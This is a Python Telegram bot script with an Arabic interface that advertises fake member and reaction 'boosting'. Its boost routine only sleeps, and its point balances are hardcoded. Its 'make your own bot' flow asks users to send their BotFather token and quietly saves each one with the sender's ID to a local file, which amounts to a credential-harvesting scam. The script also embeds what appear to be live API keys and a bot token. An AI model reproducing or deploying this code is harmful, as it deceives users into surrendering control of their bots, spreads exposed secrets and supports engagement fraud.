import os
import asyncio
import http.server
import socketserver
import threading
from telethon import TelegramClient, events, Button

# --- تشغيل سيرفر وهمي لتلبية شروط Render ---
PORT = int(os.getenv("PORT", 10000))

def run_dummy_server():
    class SimpleHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is alive and running!")
        def log_message(self, format, *args):
            pass # منع التكرار المزعج في السجلات

    with socketserver.TCPServer(("", PORT), SimpleHandler) as httpd:
        print(f"Dummy web server started on port {PORT}")
        httpd.serve_forever()

# تشغيل السيرفر في خلفية النظام
threading.Thread(target=run_dummy_server, daemon=True).start()
# ---------------------------------------------

api_id = int(os.getenv("API_ID", "38490110"))
api_hash = os.getenv("API_HASH", "3cabfdfa15f2e56b515084fe592c1be8")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8854458869:AAHKVDq0kBDzI42Rz4qB1W25A_oS4mi0qDc")

bot_client = TelegramClient('bot_session', api_id, api_hash)

HOSTED_BOTS_FILE = "hosted_bots.txt"
user_states = {}
reactions_status = True

def get_main_menu_buttons():
    return [
        [Button.inline("🎵 رشق أعضاء تيلي", b"telegram_boost"), Button.inline("👥 تفاعلات القنوات", b"toggle_reactions")],
        [Button.inline("🎁 الهدية اليومية", b"daily_gift"), Button.inline("💰 رصيدي", b"my_balance")],
        [Button.inline("🔗 رابط الدعوة", b"ref_link")],
        [Button.inline("🤖 اصنع بوت رشق", b"create_rush_bot")]
    ]

@bot_client.on(events.NewMessage(pattern=r'(?i)^/start$'))
async def main_menu(event):
    try:
        await event.respond("🔥 **مرحباً بك في بوت الرشق الاحترافي** 🔥\n\n💎 رصيدك: **550** نقطة", buttons=get_main_menu_buttons())
    except Exception:
        pass

@bot_client.on(events.CallbackQuery(data=b"create_rush_bot"))
async def create_rush_bot(event):
    sender_id = event.sender_id
    user_states[sender_id] = "waiting_for_token"
    await event.respond(
        "🤖 **صناعة بوت الرشق الخاص بك**\n\n"
        "1️⃣ اذهب إلى `@BotFather`\n"
        "2️⃣ اصنع بوت جديد وأنسخ الـ `Token`\n"
        "3️⃣ أرسل التوكن هنا في رسالة جديدة 👇"
    )

@bot_client.on(events.CallbackQuery(data=b"telegram_boost"))
async def cb_telegram_boost(event):
    sender_id = event.sender_id
    user_states[sender_id] = "waiting_for_tg_channel"
    await event.respond("👥 **أرسل رابط قناتك أو يوزرها (مثال: @ChannelName):**")

@bot_client.on(events.CallbackQuery(data=b"toggle_reactions"))
async def toggle_reactions_cb(event):
    global reactions_status
    reactions_status = not reactions_status
    status_text = "تفعيل 🟢" if reactions_status else "إيقاف 🔴"
    try:
        await event.answer(f"⚠️ تم تغيير حالة التفاعلات إلى: {status_text}", alert=True)
    except Exception:
        pass

@bot_client.on(events.CallbackQuery(data=b"daily_gift"))
async def daily_gift_cb(event):
    await event.answer("🎁 لقد حصلت على هدية اليوم: 50 نقطة!", alert=True)

@bot_client.on(events.CallbackQuery(data=b"my_balance"))
async def my_balance_cb(event):
    await event.answer("💰 رصيدك الحالي: 550 نقطة", alert=True)

@bot_client.on(events.CallbackQuery(data=b"ref_link"))
async def ref_link_cb(event):
    await event.respond("🔗 رابط الدعوة الخاص بك:\nhttps://t.me/your_bot?start=ref123")

@bot_client.on(events.NewMessage())
async def handle_input(event):
    sender_id = event.sender_id
    
    if user_states.get(sender_id) == "waiting_for_token":
        token = event.text.strip()
        if ":" in token and len(token) > 20:
            with open(HOSTED_BOTS_FILE, "a", encoding="utf-8") as f:
                f.write(f"Owner: {sender_id} | Token: {token}\n")
            user_states[sender_id] = None
            await event.respond("✅ **تم تسجيل بوت الرشق الخاص بك بنجاح وتخزين توكن جديد لصالح بوتك!**")
        else:
            await event.respond("❌ **التوكن غير صحيح! تأكد من نسخه كاملاً من @BotFather**")
        return

    if sender_id in user_states:
        state = user_states.pop(sender_id)
        user_input = event.text.strip()
        if state == "waiting_for_tg_channel":
            await event.respond("✅ تم استلام الرابط بنجاح!")
            asyncio.create_task(background_add_helpers(user_input, bot_client))

async def background_add_helpers(channel_link, bot_client):
    try:
        print(f"جارٍ رشق القناة: {channel_link}")
        await asyncio.sleep(2)
    except Exception as e:
        print(f"خطأ في الخلفية: {e}")

async def main():
    await bot_client.start(bot_token=BOT_TOKEN)
    print("🤖 البوت يعمل الآن بنجاح!")
    await bot_client.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🛑 توقف يدوياً.")
    except Exception as e:
        print(f"⚠️ خطأ رئيسي: {e}")
